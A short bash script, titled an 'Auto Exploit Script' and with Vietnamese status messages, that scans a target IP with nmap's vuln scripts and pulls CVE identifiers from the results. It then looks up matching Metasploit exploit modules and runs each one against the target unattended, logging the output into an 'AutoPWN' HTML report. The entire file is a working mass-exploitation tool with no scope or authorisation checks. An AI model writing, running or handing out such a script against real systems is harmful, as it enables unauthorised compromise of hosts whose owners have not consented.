#!/bin/bash

# ===============================
# NMAP + CVE Auto Exploit Script
# ===============================

TARGET=$1
REPORT_DIR="autopwn_report"
NMAP_OUT="$REPORT_DIR/nmap_scan.txt"
CVE_LIST="$REPORT_DIR/cve_list.txt"
LOG_FILE="$REPORT_DIR/exploit_log.txt"
HTML_REPORT="$REPORT_DIR/report.html"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

mkdir -p $REPORT_DIR
> $CVE_LIST
> $LOG_FILE

echo "[*] Quét lỗ hổng bằng Nmap trên $TARGET..."
nmap -sV --script vuln $TARGET -oN $NMAP_OUT

echo "[*] Trích xuất CVE từ kết quả scan..."
grep -Eo "CVE-[0-9]{4}-[0-9]{4,7}" $NMAP_OUT | sort -u > $CVE_LIST

if [ ! -s $CVE_LIST ]; then
    echo "[!] Không tìm thấy CVE nào!"
    exit 1
fi

echo "[+] Danh sách CVE tìm được:"
cat $CVE_LIST

echo "[*] Bắt đầu khai thác..."
while read CVE; do
    echo -e "\n[+] Đang xử lý CVE: $CVE" | tee -a $LOG_FILE
    MODULES=$(msfconsole -q -x "search $CVE; exit" | grep exploit | awk '{print $2}')
    if [ -n "$MODULES" ]; then
        for MODULE in $MODULES; do
            echo "[*] Module: $MODULE" | tee -a $LOG_FILE
            msfconsole -q -x "
                use $MODULE;
                set RHOSTS $TARGET;
                set LHOST 0.0.0.0;
                run;
                exit;
            " | tee -a $LOG_FILE
        done
    else
        echo "[!] Không tìm thấy module cho $CVE" | tee -a $LOG_FILE
    fi
done < $CVE_LIST

echo "[*] Xuất báo cáo HTML..."
echo "<html><body><h1>AutoPWN Report - $TARGET</h1><pre>" > $HTML_REPORT
cat $LOG_FILE >> $HTML_REPORT
echo "</pre></body></html>" >> $HTML_REPORT

echo "[+] Hoàn tất! Báo cáo: $HTML_REPORT"
